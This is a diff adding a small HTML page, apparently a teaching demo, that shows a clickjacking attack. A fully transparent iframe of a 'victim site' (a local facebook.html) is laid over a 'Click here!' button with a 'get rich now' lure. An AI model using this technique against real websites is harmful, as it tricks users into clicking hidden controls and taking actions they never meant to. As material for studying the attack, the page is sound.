@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The clickjacking attack</title>
+</head>
+
+<body>
+    <style>
+        iframe {
+            width: 400px;
+            height: 100px;
+            position: absolute;
+            top: 500px;
+            left: -14px;
+            opacity: 0;
+            z-index: 1;
+        }
+    </style>
+    <div>Click to get rich now:</div>
+
+    <!-- The url from the victim site -->
+    <iframe src="facebook.html"></iframe>
+
+    <button>Click here!</button>
+
+    <div>...And you're cool (I'm a cool hacker actually)!</div>
+
+    <script>
+
+    </script>
+</body>
+
+</html>
